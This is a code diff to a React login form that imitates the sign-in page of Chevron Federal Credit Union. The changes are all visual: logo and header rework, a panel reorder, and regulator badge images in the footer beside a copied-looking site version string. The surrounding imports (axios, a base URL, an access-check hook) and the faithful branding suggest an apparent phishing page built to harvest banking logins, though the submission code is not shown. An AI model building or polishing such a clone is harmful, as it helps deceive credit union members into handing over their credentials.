@@ -4,19 +4,6 @@ import axios from 'axios';
 import { baseUrl } from '../constants';
 import useAccessCheck from '../Utils/useAccessCheck';
 
-const ChevronBadge = () => (
-  <svg
-    viewBox="0 0 120 90"
-    role="img"
-    aria-label="Chevron Federal Credit Union"
-    className="h-14 w-auto"
-  >
-    <path d="M0 0h120v52L60 72 0 52V0z" fill="#004a98" />
-    <path d="M0 52l60 20 60-20v16L60 90 0 68z" fill="#e21f26" />
-    <path d="M0 42l60 20 60-20v10L60 62 0 52z" fill="#009fe3" />
-  </svg>
-);
-
 const complianceBadges = [
   {
     title: 'Equal Housing Lender',
@@ -122,24 +109,20 @@ const LoginForm: React.FC = () => {
 
   return (
     <div className="min-h-screen bg-white text-[#0e2f56] flex flex-col">
-      <header className="border-b border-gray-200">
-        <div className="max-w-6xl mx-auto px-6 py-6 flex items-center gap-5">
-          <ChevronBadge />
-          <div>
-            <p className="text-2xl font-semibold tracking-tight">
-              Chevron Federal Credit Union
-            </p>
-            <p className="text-sm text-[#3c7dca]">
-              Secure access to digital banking
-            </p>
-          </div>
-        </div>
-      </header>
-
       <main className="flex-1">
         <section className="bg-gradient-to-r from-[#002c5c] via-[#014a90] to-[#0073ba] py-12 px-4">
-          <div className="max-w-5xl mx-auto bg-gradient-to-b from-[#f0f6fb] to-[#dfeef9] shadow-2xl rounded-sm flex flex-col md:flex-row">
-            <div className="w-full md:w-5/12 px-8 py-10 border-b md:border-b-0 md:border-r border-[#91c1e4]">
+          <div className="max-w-5xl mx-auto">
+            <div className="flex items-center gap-4 mb-8">
+              <img
+                src="/assets/header_logo_bg.png"
+                alt="Chevron Federal Credit Union"
+                className="h-16 w-auto"
+              />
+       
+            </div>
+
+            <div className="bg-gradient-to-b from-[#f0f6fb] to-[#dfeef9] shadow-2xl rounded-sm flex flex-col md:flex-row">
+            <div className="order-2 md:order-1 w-full md:w-5/12 px-8 py-10 border-t md:border-t-0 md:border-r border-[#91c1e4] md:rounded-l-sm">
               <p className="text-2xl font-semibold text-[#0b5da7] mb-2">
                 New to Digital Banking?
               </p>
@@ -154,8 +137,7 @@ const LoginForm: React.FC = () => {
                 Enroll Now
               </button>
             </div>
-
-            <div className="w-full md:w-7/12 px-8 py-10">
+            <div className="order-1 md:order-2 w-full md:w-7/12 px-8 py-10">
               <div className="flex flex-col md:flex-row md:items-center gap-4 mb-8">
                 <h2 className="text-lg font-semibold tracking-wide uppercase text-[#0e2f56]">
                   Secure Sign In
@@ -240,6 +222,7 @@ const LoginForm: React.FC = () => {
                 </div>
               </form>
             </div>
+            </div>
           </div>
         </section>
 
@@ -280,9 +263,23 @@ const LoginForm: React.FC = () => {
       </main>
 
       <footer className="border-t border-gray-200">
-        <div className="max-w-5xl mx-auto px-4 py-6 text-xs text-gray-600 flex flex-col md:flex-row md:items-center md:justify-between gap-3">
-          <p>© 2025 Chevron Federal Credit Union</p>
-          <p>Version: 10.34.20250707.705.AWS</p>
+        <div className="max-w-5xl mx-auto px-4 py-6 flex flex-col md:flex-row md:items-center md:justify-between gap-6">
+          <div className="flex items-center justify-center md:justify-start gap-4">
+            <img
+              src="/assets/equal-housing.png"
+              alt="Equal Housing Lender"
+              className="h-12 w-auto"
+            />
+            <img
+              src="/assets/ncua.png"
+              alt="National Credit Union Administration"
+              className="h-12 w-auto"
+            />
+          </div>
+          <div className="text-xs text-gray-600 text-center md:text-right space-y-1">
+            <p>© 2025 Chevron Federal Credit Union</p>
+            <p>Version: 10.34.20250707.705.AWS</p>
+          </div>
         </div>
       </footer>
 
